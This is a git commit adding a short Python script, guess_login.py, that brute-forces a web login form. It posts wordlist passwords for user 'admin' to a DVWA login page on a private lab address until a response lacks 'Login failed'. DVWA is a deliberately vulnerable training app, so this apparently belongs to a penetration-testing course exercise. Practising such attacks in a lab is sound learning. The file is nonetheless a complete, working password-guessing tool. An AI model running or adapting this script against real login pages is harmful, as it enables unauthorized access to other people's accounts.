391af7ea03e6bbf1f210e5600495142ea44f83d9
root <gvrosun@gmail.com>
2020-07-25 12:58:58 +0530

    guess_login.py 1.0 stable

---
+++ website/guess_login.py
@@ -0,0 +1,17 @@
+#!/usr/bin/env python
+
+import requests
+
+target_url = "http://10.0.2.5/dvwa/login.php"
+data_dict = {"username": "admin", "password": "", "Login": "submit"}
+
+with open("/root/Downloads/passwords.txt", "r") as word_list:
+    for line in word_list:
+        word = line.strip()
+        data_dict["password"] = word
+        response = requests.post(target_url, data=data_dict)
+        if "Login failed" not in response.content:
+            print("[+] Got the password --> " + word)
+            exit()
+
+print("[-] Password not found")
